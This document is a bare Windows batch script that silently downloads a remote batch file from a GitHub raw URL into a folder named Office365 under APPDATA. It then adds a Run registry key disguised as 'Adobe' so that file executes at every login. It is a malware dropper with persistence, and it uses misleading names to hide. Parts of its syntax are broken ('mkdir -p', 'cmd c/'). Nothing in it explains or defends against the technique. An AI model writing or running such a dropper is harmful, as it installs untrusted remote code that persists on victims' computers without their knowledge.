@echo off
mkdir -p %APPDATA%\Office365
curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Office365\main.bat 
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Adobe /t REG_SZ /d "cmd c/ %APPDATA%\Office365\main.bat"
